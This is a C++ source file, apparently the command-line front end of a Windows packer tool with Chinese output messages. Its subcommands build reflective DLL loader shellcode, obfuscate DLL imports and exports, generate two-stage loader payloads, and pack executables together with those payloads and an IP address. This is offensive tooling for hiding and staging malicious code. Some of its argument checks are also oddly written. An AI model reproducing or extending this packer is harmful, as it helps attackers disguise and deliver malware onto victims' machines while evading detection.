#include "packer.h"
#include "cmdline.h"
using namespace Packer;

int main(int argc, char** argv)
{
    cmdline::parser a;
    a.add("generate_reflective_loader", '\x0', "[--obj][--dll][--output]");
    a.add("obfuse_dll_export", '\x0', "[--dll]");
    a.add("obfuse_dll_import", '\x0', "[--dll]");
    a.add("make_loader_payload", '\x0', "[--obj]");
    a.add("pack_exe", '\x0', "[--exe][--dll][--output]");
    a.add("make_template_cfg", '\x0', "make_template_cfg");
    a.add("copy_append_data", '\x0', "[--src][--dst]");
    a.add("expand_cache_dll", '\x0', "[--src][--dst]");
    a.add("dll_compare", '\x0', "[--dll1][--dll2]");
    a.add("static_detect", '\x0', "[--exe][--output]");
    a.add<std::string>("src", '\x0', "src path", false);
    a.add<std::string>("dst", '\x0', "dst path", false);
    a.add<std::string>("obj", 'o', "obj path", false);
    a.add<std::string>("dll", 'd', "dll path", false);
    a.add<std::string>("exe", 'e', "exe path", false);
    a.add<std::string>("config", 'c', "config", false);
    a.add<std::string>("ip_address", 'i', "ip_address", false);
    a.add<std::string>("output", '\x0', "output path", false);
    a.add<std::string>("dll1", 'd1', "dll1 path", false);
    a.add<std::string>("dll2", 'd2', "dll2 path", false);
    a.parse_check(argc, argv);
    if (a.exist("generate_reflective_loader"))
    {
        if (!(a.exist("obj") && a.exist("output")) && a.exist("dll"))
            return 1;
        std::string payload;
        build_raw_shellcode(a.get<std::string>("obj"), 
            "_reflective_loader_entry", 
            load_file(a.get<std::string>("dll")), 
            a.get<std::string>("output"), 
            payload);
        return 0;
    }
    else if (a.exist("obfuse_dll_export"))
    {
        obfuse_dll_export(a.get<std::string>("dll"));
        return 0;
    }
    else if (a.exist("obfuse_dll_import"))
    {
        obfuse_dll_import(a.get<std::string>("dll"), a.get<std::string>("output"));
        return 0;
    }
    else if (a.exist("make_loader_payload"))
    {
        fs::path output_dir(a.get<std::string>("output"));

        std::string stage_first_payload;
        std::string stage_second_payload;
        build_raw_shellcode(a.get<std::string>("obj"),
            "_loader_entry@4",
            "",
            (output_dir / "stage_1_payload.bin").string(),
            stage_first_payload);
        build_raw_shellcode(a.get<std::string>("obj"),
            "_stub_entry@4",
            "",
            (output_dir / "stage_2_payload.bin").string(),
            stage_second_payload);
        return 0;
    }
    else if (a.exist("pack_exe"))
    {
        if (!(a.exist("dll") && a.exist("output")) && a.exist("exe"))
            return 1;
        
        if (build_packfile(a.get<std::string>("exe"),
            a.get<std::string>("dll"),
            a.get<std::string>("output"),
            load_file(get_parent_dir() / "stage_1_payload.bin"),
            load_file(get_parent_dir() / "stage_2_payload.bin"),
            //a.get<std::string>("config"),
            a.get<std::string>("ip_address")))
        {
            std::cout << "加壳前大小:" << fs::file_size(a.get<std::string>("exe")) << std::endl;
            std::cout << "加壳后大小:" << fs::file_size(a.get<std::string>("output")) << std::endl;
            std::cout << "加壳成功" << std::endl;
            return 0;
        }
        std::cout << "加壳失败" << std::endl;
        return 1;
    }
    else if (a.exist("copy_append_data"))
    {
        if (!(a.exist("src") && a.exist("dst")))
            return 1;

        if (copy_append_data(a.get<std::string>("src"),
            a.get<std::string>("dst")))
        {
            std::cout << "拷贝成功" << std::endl;
            return 0;
        }
        std::cout << "拷贝失败" << std::endl;
        return 1;
    }
    else if(a.exist("make_template_cfg"))
    {
        if (a.exist("output") == false)
            return 1;
        make_template_cfg(a.get<std::string>("output"));
        return 0;
    }
    else if (a.exist("expand_cache_dll"))
    {
        if (!(a.exist("src") && a.exist("dst")))
            return 1;
        expand_cache_dll(a.get<std::string>("src"),
            a.get<std::string>("dst"));
        return 0;
    }
    else if (a.exist("dll_compare"))
    {
        if (!(a.exist("dll1") && a.exist("dll2")))
            return 1;
        std::string dll1 = a.get<std::string>("dll1");
        if (!std::filesystem::exists(dll1))
        {
            std::cout << "dll1 file not found" << std::endl;
            return 1;
        }
        std::string dll2 = a.get<std::string>("dll2");
        if (!std::filesystem::exists(dll2))
        {
            std::cout << "dll2 file not found" << std::endl;
            return 1;
        }
        std::string result;
        if (client_code_verify(dll1, dll2, result))
        {
            std::cout << "比较结果:\n" << result.c_str() << std::endl;
        }
        return 0;
    }
    else if (a.exist("static_detect"))
    {
        if (!(a.exist("exe") && a.exist("output")))
            return 1;
        std::string exe = a.get<std::string>("exe");
        std::string output = a.get<std::string>("output");

        if (!std::filesystem::exists(exe))
        {
            std::cout << "exe file not found" << std::endl;
            return 1;
        }
        if (std::filesystem::is_directory(exe))
        {
            for (auto& file : std::filesystem::directory_iterator(exe))
            {
                if (file.path().extension() == ".exe")
                {
                    extract_pe_main_icon(file.path().string(), output);
                }
            }
        }
        else
        {
            extract_pe_main_icon(exe, output);
        }
        return 0;
    }
    std::cerr << a.usage() << std::endl;
    return 1;
}
